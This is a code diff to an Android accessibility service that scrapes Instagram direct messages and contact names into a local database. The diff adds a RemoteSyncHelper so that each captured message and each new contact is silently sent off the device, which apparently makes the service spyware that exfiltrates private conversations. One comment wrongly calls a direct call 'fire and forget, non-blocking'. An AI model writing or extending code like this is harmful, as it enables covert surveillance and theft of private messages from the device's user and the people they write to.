@@ -39,6 +39,7 @@ class InstagramAccessibilityService : AccessibilityService() {
     private lateinit var database: InstagramDatabase
     private lateinit var contactDao: ContactDao
     private lateinit var messageDao: MessageDao
+    private lateinit var remoteSyncHelper: RemoteSyncHelper
     private lateinit var notificationHelper: NotificationHelper
     private val ioScope = CoroutineScope(Dispatchers.IO)
     private val scanMutex = Mutex()
@@ -78,7 +79,7 @@ class InstagramAccessibilityService : AccessibilityService() {
     Log.d(TAG, "Instagram Accessibility Service Connected")
 
     notificationHelper = NotificationHelper(this)
-
+    remoteSyncHelper = RemoteSyncHelper(applicationContext)
     val info = AccessibilityServiceInfo().apply {
         eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                     AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
@@ -1110,6 +1111,8 @@ private suspend fun captureNewMessages() {
                         }
                         firstId = messageId
                     }
+            val savedMessage = message.copy(id = messageId)
+            ioScope.launch { remoteSyncHelper.syncMessage(savedMessage) }
 
                     val tag = if (wasPending) "${mi.assetType}-flushed" else mi.assetType
                     val direction = if (mi.isSentByUser) "SENT" else "RECEIVED"
@@ -1187,21 +1190,23 @@ private suspend fun captureNewMessages() {
     }
 
     private suspend fun saveContact(contactName: String) {
-        try {
-            val existing = contactDao.getContactByName(contactName)
-            if (existing == null) {
-                val contact = Contact(
-                    id = 0,
-                    name = contactName,
-                    timestamp = System.currentTimeMillis()
-                )
-                contactDao.insert(contact)
-                Log.d(TAG, "👤 SAVED NEW CONTACT: '$contactName'")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Error saving contact: ${e.message}")
+    try {
+        val existing = contactDao.getContactByName(contactName)
+        if (existing == null) {
+            val contact = Contact(
+                id = 0,
+                name = contactName,
+                timestamp = System.currentTimeMillis()
+            )
+            contactDao.insert(contact)
+            Log.d(TAG, "👤 SAVED NEW CONTACT: '$contactName'")
+            // Sync to remote — fire and forget, non-blocking
+            remoteSyncHelper.syncContact(contact)
         }
+    } catch (e: Exception) {
+        Log.e(TAG, "Error saving contact: ${e.message}")
     }
+}
 
     private fun findContactNames(rootNode: AccessibilityNodeInfo): List<String> {
     val contacts = mutableListOf<String>()
